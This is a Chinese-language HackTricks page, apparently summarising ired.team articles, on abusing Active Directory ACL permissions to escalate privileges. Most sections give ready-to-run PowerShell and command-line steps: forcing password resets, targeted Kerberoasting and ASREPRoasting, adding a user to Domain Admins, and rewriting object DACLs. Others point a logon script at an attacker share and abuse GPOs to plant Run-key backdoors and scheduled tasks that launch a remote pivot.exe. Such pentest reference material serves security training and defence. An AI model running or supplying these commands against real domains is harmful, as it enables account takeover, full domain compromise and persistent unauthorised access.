# 滥用Active Directory ACLs/ACEs

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏品](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**本页主要总结了来自[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)和[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)的技术。有关更多详细信息，请查看原始文章。**

## **用户的GenericAll权限**
此权限授予攻击者对目标用户帐户的完全控制。一旦使用`Get-ObjectAcl`命令确认了`GenericAll`权限，攻击者可以：

- **更改目标的密码**：使用`net user <username> <password> /domain`，攻击者可以重置用户的密码。
- **有针对性的Kerberoasting**：为用户帐户分配一个SPN以使其可以进行Kerberoasting，然后使用Rubeus和targetedKerberoast.py来提取并尝试破解票据授予票据（TGT）哈希。
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **目标化 ASREPRoasting**: 禁用用户的预身份验证，使其帐户容易受到 ASREPRoasting 攻击。
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll权限对组的影响**
这个权限允许攻击者在拥有`GenericAll`权限的组（如`Domain Admins`）上操纵组成员。在使用`Get-NetGroup`识别组的专有名称后，攻击者可以：

- **将自己添加到Domain Admins组中**：可以通过直接命令或使用Active Directory或PowerSploit等模块来完成。
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**
拥有计算机对象或用户帐户上的这些权限允许：

- **Kerberos基于资源的受限委派**：启用接管计算机对象。
- **影子凭据**：利用创建影子凭据的特权来冒充计算机或用户帐户。

## **WriteProperty on Group**
如果用户对特定组（例如`Domain Admins`）的所有对象具有`WriteProperty`权限，则他们可以：

- **将自己添加到Domain Admins组**：通过结合`net user`和`Add-NetGroupUser`命令，可以实现此方法，从而在域内提升特权。
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **组中的自身（自我成员资格）**
此权限使攻击者能够通过直接操作组成员资格的命令将自己添加到特定组，例如`Domain Admins`。使用以下命令序列可以实现自我添加：
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty（自我成员资格）**
类似的权限，允许攻击者通过修改组属性将自己直接添加到组中，前提是他们对这些组具有`WriteProperty`权限。此权限的确认和执行如下进行：
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
持有用户的`ExtendedRight`权限用于`User-Force-Change-Password`允许在不知道当前密码的情况下重置密码。可以通过PowerShell或替代命令行工具验证此权限并利用它，提供了几种方法来重置用户的密码，包括交互式会话和非交互式环境的一行命令。这些命令从简单的PowerShell调用到在Linux上使用`rpcclient`，展示了攻击向量的多样性。
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **在组上使用WriteOwner权限**
如果攻击者发现自己拥有对组的`WriteOwner`权限，他们可以将该组的所有权更改为自己。当涉及的组是`Domain Admins`时，这将产生重大影响，因为更改所有权允许对组属性和成员资格进行更广泛的控制。该过程涉及通过`Get-ObjectAcl`识别正确的对象，然后使用`Set-DomainObjectOwner`通过SID或名称修改所有者。
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **用户的GenericWrite权限**
这个权限允许攻击者修改用户属性。具体来说，通过`GenericWrite`访问权限，攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。这可以通过使用`Set-ADObject`命令来更新目标用户的`scriptpath`属性，将其指向攻击者的脚本来实现。
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **组上的GenericWrite权限**
具有此权限的攻击者可以操纵组成员资格，例如将自己或其他用户添加到特定组中。该过程涉及创建凭据对象，使用它向组中添加或移除用户，并使用PowerShell命令验证成员资格更改。
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
拥有一个AD对象并具有对其的`WriteDACL`权限使攻击者能够授予自己对该对象的`GenericAll`权限。这是通过ADSI操作实现的，允许完全控制对象并能够修改其组成员资格。尽管如此，在尝试使用Active Directory模块的`Set-Acl` / `Get-Acl`命令时，利用这些权限进行利用存在限制。
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **域复制（DCSync）**
DCSync攻击利用域上的特定复制权限模仿域控制器并同步数据，包括用户凭据。这种强大的技术需要像`DS-Replication-Get-Changes`这样的权限，允许攻击者从AD环境中提取敏感信息，而无需直接访问域控制器。
[**在此了解有关DCSync攻击的更多信息。**](../dcsync.md)







## GPO委派 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO委派

委派访问以管理组策略对象（GPO）可能存在重大安全风险。例如，如果像`offense\spotless`这样的用户被委派了GPO管理权限，他们可能拥有**WriteProperty**、**WriteDacl**和**WriteOwner**等权限。这些权限可能被滥用用于恶意目的，可以使用PowerView进行识别：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### 枚举GPO权限

为了识别配置错误的GPO，可以链接PowerSploit的cmdlets。这允许发现特定用户有权限管理的GPO：
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**应用了特定策略的计算机**：可以确定特定GPO适用于哪些计算机，帮助了解潜在影响的范围。
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**应用于特定计算机的策略**：要查看应用于特定计算机的策略，可以使用`Get-DomainGPO`等命令。

**应用了特定策略的OU**：可以使用`Get-DomainOU`来识别受特定策略影响的组织单位（OU）。

### 滥用GPO - New-GPOImmediateTask

可以利用配置错误的GPO来执行代码，例如，通过创建即时计划任务。这可以用于将用户添加到受影响计算机上的本地管理员组，显著提升权限：
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy 模块 - 滥用 GPO

GroupPolicy 模块（如果已安装）允许创建和链接新的 GPO，并设置偏好，如注册表值以在受影响的计算机上执行后门。此方法需要更新 GPO 并要求用户登录计算机以执行：
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - 滥用 GPO

SharpGPOAbuse 提供了一种滥用现有 GPO 的方法，可以添加任务或修改设置，而无需创建新的 GPO。该工具需要修改现有 GPO 或使用 RSAT 工具创建新的 GPO，然后应用更改：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制策略更新

GPO 更新通常每 90 分钟发生一次。为了加快这一过程，特别是在实施更改后，可以在目标计算机上使用 `gpupdate /force` 命令来强制立即更新策略。该命令确保对 GPO 的任何修改都会立即生效，而不必等待下一次自动更新周期。

### 内部机制

检查给定 GPO 的计划任务时，如 `Misconfigured Policy`，可以确认是否添加了诸如 `evilTask` 等任务。这些任务是通过脚本或命令行工具创建的，旨在修改系统行为或提升权限。

任务的结构，如通过 `New-GPOImmediateTask` 生成的 XML 配置文件所示，概述了计划任务的具体内容 - 包括要执行的命令及其触发器。该文件展示了如何在 GPO 中定义和管理计划任务，提供了执行任意命令或脚本作为策略执行一部分的方法。

### 用户和组

GPO 还允许在目标系统上操作用户和组成员资格。通过直接编辑用户和组策略文件，攻击者可以将用户添加到特权组，如本地的 `administrators` 组。这是通过委派 GPO 管理权限实现的，允许修改策略文件以包含新用户或更改组成员资格。

用户和组的 XML 配置文件概述了这些更改是如何实施的。通过向该文件添加条目，特定用户可以在受影响的系统中获得提升的权限。这种方法通过 GPO 操纵提供了一种直接的特权升级途径。

此外，还可以考虑其他执行代码或保持持久性的方法，例如利用登录/注销脚本、修改注册表键以进行自启动、通过 .msi 文件安装软件或编辑服务配置。这些技术提供了通过滥用 GPO 来保持访问权限和控制目标系统的各种途径。
